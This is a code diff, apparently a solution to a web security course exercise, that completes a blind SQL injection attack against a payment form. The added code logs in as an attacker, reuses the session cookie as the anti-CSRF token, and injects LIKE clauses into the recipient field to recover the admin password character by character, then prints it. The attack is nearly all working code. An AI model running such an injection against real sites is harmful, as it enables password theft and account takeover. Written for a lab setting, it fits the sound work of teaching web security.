@@ -13,17 +13,44 @@ def submit_login_form(sess, username, password):
     return response.status_code == codes.ok
 
 def submit_pay_form(sess, recipient, amount):
+    csrf_token = sess.cookies.get("session")
+    # print("CSRF TOKEN: {}".format(csrf_token))
     response = sess.post(PAY_FORM_URL,
                     data={
                         "recipient": recipient,
                         "amount": amount,
+                        "anticsrf_token": csrf_token,
                     })
     return response.status_code == codes.ok
 
+def test_char(sess, username, password_so_far):
+    chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
+    for c in chars:
+        s = "{}' AND users.password LIKE '{}{}%".format(username, password_so_far, c)
+        response = submit_pay_form(sess, s, 0)
+        if response:
+           print("Successful request with character {} and password so far '{}'".format(c, password_so_far))
+           return c
+
 def sqli_attack(username):
     sess = Session()
+    # Verify attacker logged in successfully
     assert(submit_login_form(sess, "attacker", "attacker"))
-    pass
+   
+    # Can learn about password with wildcards and trying different characters
+    s_test = "{}' AND users.password LIKE 'websecurityisfun%".format(username)
+    # response = submit_pay_form(sess, s_test, 0)
+    # print(response)
+
+    password = []
+    while True:
+        c = test_char(sess, username, "".join(password))
+        if c is None:
+            break;
+        password.append(c)
+
+    print("".join(password))
+        
 
 def main():
     sqli_attack("admin")
